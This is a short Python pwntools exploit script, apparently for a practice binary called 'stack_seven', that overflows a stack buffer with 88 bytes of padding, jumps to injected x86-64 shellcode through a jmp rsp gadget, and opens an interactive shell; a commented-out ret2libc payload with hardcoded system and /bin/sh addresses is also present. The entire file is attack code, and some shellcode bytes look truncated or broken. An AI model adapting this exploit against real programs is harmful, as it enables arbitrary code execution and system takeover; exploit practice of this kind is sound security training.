from pwn import * 

buf =  b""
buf += b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69"
buf += b"\x00\x53\x48\x89\xe7\x68\x2d\x63\x00"
buf += b"\x52\xe8\x08\x00\x00\x00\x2f\x62\x69"
buf += b"\x00\x56\x57\x48\x89\xe6\x0f\x05"

system = p64(0x7ffff7e30860)
dummy = p64(0xffffffffffffffff)
bin_sh = p64(0x7ffff7f7f882)
jmp_rsp = p64(0x402063)
offset = 88

#payload = b'a'*offset + system + dummy + bin_sh

payload = b'a'*offset + jmp_rsp + buf

p = process('./stack_seven')
p.sendline(payload)
p.interactive()
